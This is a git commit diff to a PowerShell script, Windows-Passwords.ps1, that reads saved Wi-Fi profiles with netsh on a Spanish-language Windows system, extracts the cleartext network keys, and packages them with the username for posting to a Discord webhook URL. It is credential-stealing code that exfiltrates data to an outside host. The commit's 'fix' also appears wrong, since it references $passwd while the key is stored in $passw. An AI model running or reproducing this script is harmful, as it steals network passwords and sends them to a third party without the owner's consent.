678cd1d8ee6f56963d813a3694889e1536415d13
Javi Rufo <150443755+javirufo-ies@users.noreply.github.com>
2025-12-10 08:59:01 +0100

    Fix variable reference for password output

--- Windows-Passwords.ps1
+++ Windows-Passwords.ps1
@@ -2,7 +2,7 @@ $discord = "https://discord.com/api/webhooks/1447492875704205362/VyqK99hc7pwqslo
 netsh wlan show profile | Select-String '(?<=Perfil de todos los usuarios\s+:\s).+' | ForEach-Object {
     $wlan  = $_.Matches.Value
     $passw = netsh wlan show profile $wlan key=clear | Select-String '(?<=Contenido de la clave\s+:\s).+' 
-	Write-Output $wlan + "-->" + [string]$passwd
+	Write-Output $wlan + "-->" + $passwd
 	$Body = @{
 		'username' = $env:username + " | " + [string]$wlan
 		'content' = [string]$passw
